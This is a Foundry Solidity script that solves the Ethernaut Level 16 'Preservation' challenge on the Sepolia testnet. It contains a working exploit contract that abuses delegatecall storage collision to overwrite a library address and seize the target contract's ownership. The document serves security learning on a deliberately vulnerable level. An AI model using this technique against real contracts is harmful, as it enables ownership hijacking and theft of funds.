// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/Preservation.sol";

/*
    Solution script for the Ethernaut Level 16: Preservation

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in PreservationScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/Preservation.s.sol:PreservationScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/Preservation.s.sol/11155111
*/

contract PreservationAttack {

    address public t1;
    address public t2;
    address public owner;
    Preservation level16;
    
    constructor(address _target) {
        level16 = Preservation(_target);
    }

    function exploit() external {
        level16.setFirstTime(uint256(uint160(address(this))));
        level16.setFirstTime(uint256(uint160(msg.sender)));
    }

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }

}

contract PreservationScript is Script {
    // replace instance with your level1 instance adddress
    address instance = 0xC0Bfd46320f81E510B27EC33F280e2cE5bbf42F3;
    Preservation level16 = Preservation(instance);

    function run() external {
        vm.startBroadcast();

        require(level16.owner() != msg.sender, "Ownership already claimed");
        // console.log("level16.owner(): ", level16.owner());

        PreservationAttack attack = new PreservationAttack(instance);
        attack.exploit();

        // if the player is not the owner then we have failed so revert
        // console.log("level16.owner(): ", level16.owner());
        require(level16.owner() == msg.sender, "Owner not updated correctly");

        vm.stopBroadcast();
    }
}